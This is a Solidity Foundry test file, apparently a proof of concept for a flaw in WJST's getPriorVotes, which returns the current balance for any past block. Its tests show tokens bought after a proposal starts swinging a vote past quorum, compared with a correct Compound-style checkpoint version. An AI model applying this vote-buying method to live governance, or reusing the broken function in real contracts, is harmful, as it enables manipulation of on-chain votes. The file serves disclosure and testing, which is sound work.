// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal reproduction of WJST's broken getPriorVotes
contract MockWJST {
    mapping(address => uint256) public balanceOf_;

    function deposit(address user, uint256 amount) external {
        balanceOf_[user] += amount;
    }

    function withdraw(address user, uint256 amount) external {
        balanceOf_[user] -= amount;
    }

    // JustLend's broken implementation — ignores blockNumber
    function getPriorVotes(address account, uint256 blockNumber) public view returns (uint256) {
        blockNumber; // silently discarded
        return balanceOf_[account];
    }
}

// Reference: Compound's correct implementation with checkpoints
contract MockCompVotes {
    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }

    mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
    mapping(address => uint32) public numCheckpoints;
    mapping(address => uint256) public balanceOf_;

    function deposit(address user, uint256 amount) external {
        balanceOf_[user] += amount;
        _writeCheckpoint(user, balanceOf_[user]);
    }

    function _writeCheckpoint(address user, uint256 newVotes) internal {
        uint32 nCheckpoints = numCheckpoints[user];
        checkpoints[user][nCheckpoints] = Checkpoint(uint32(block.number), newVotes);
        numCheckpoints[user] = nCheckpoints + 1;
    }

    function getPriorVotes(address account, uint256 blockNumber) public view returns (uint256) {
        require(blockNumber < block.number, "not yet determined");
        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) return 0;
        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
            return checkpoints[account][nCheckpoints - 1].votes;
        }
        if (checkpoints[account][0].fromBlock > blockNumber) return 0;
        uint32 lower = 0;
        uint32 upper = nCheckpoints - 1;
        while (upper > lower) {
            uint32 center = upper - (upper - lower) / 2;
            if (checkpoints[account][center].fromBlock <= blockNumber) {
                lower = center;
            } else {
                upper = center - 1;
            }
        }
        return checkpoints[account][lower].votes;
    }
}

contract WJSTGovernanceExploitTest is Test {
    MockWJST wjst;
    MockCompVotes compVotes;

    address attacker = address(0xBEEF);

    function setUp() public {
        wjst = new MockWJST();
        compVotes = new MockCompVotes();
    }

    function test_WJSTReturnsCurrentBalanceNotHistorical() public {
        // Block 100: proposal is created, attacker has 0 WJST
        vm.roll(100);
        uint256 proposalStartBlock = block.number;

        // Verify attacker has 0 votes at proposal creation
        assertEq(wjst.getPriorVotes(attacker, proposalStartBlock), 0);

        // Block 105: attacker acquires tokens AFTER proposal
        vm.roll(105);
        wjst.deposit(attacker, 1_000_000e18);

        // VULNERABILITY: getPriorVotes returns CURRENT balance for a PAST block
        // Should return 0 (balance at block 100), but returns 1_000_000e18
        uint256 votingPower = wjst.getPriorVotes(attacker, proposalStartBlock);
        assertEq(votingPower, 1_000_000e18, "WJST returns current balance for past block");

        // This means attacker can vote with tokens acquired AFTER the proposal
        assertTrue(votingPower > 0, "Attacker has voting power despite having 0 at proposal creation");
    }

    function test_CompoundCorrectlyReturnsHistoricalBalance() public {
        // Block 100: proposal is created, attacker has 0
        vm.roll(100);
        uint256 proposalStartBlock = block.number;

        // Block 105: attacker acquires tokens AFTER proposal
        vm.roll(105);
        compVotes.deposit(attacker, 1_000_000e18);

        // Block 106: check voting power
        vm.roll(106);

        // CORRECT: returns 0 for block 100 (attacker had no tokens then)
        uint256 votingPower = compVotes.getPriorVotes(attacker, proposalStartBlock);
        assertEq(votingPower, 0, "Compound correctly returns 0 for past block");

        // Returns current balance for block 105
        uint256 currentPower = compVotes.getPriorVotes(attacker, 105);
        assertEq(currentPower, 1_000_000e18, "Compound correctly returns deposited amount for current block");
    }

    function test_PostProposalVoteBuyingAttack() public {
        address legitimateVoter = address(0xCAFE);

        // Block 100: legitimate voter has 500M WJST, attacker has 0
        vm.roll(100);
        wjst.deposit(legitimateVoter, 500_000_000e18);
        uint256 proposalStartBlock = block.number;

        // Block 101: proposal is created (startBlock = 100)
        vm.roll(101);

        // Block 110: attacker sees proposal, buys 200M JST and deposits
        vm.roll(110);
        wjst.deposit(attacker, 200_000_000e18);

        // Attacker's voting power at proposal.startBlock (should be 0, but returns current)
        uint256 attackerVotes = wjst.getPriorVotes(attacker, proposalStartBlock);

        // VULNERABILITY DEMONSTRATED:
        // Attacker has 200M voting power despite having 0 at proposal creation
        assertEq(attackerVotes, 200_000_000e18);

        // This could swing a close vote:
        // For: legitimateVoter (500M) + attacker (200M) = 700M > quorum (600M)
        // Without attacker: only 500M < quorum (600M)
        // Attacker's post-proposal purchase swings the outcome
        uint256 legitimateVotes = wjst.getPriorVotes(legitimateVoter, proposalStartBlock);
        assertTrue(legitimateVotes < 600_000_000e18, "Legitimate votes alone don't reach quorum");
        assertTrue(
            legitimateVotes + attackerVotes >= 600_000_000e18,
            "With attacker's post-proposal votes, quorum is reached"
        );
    }
}
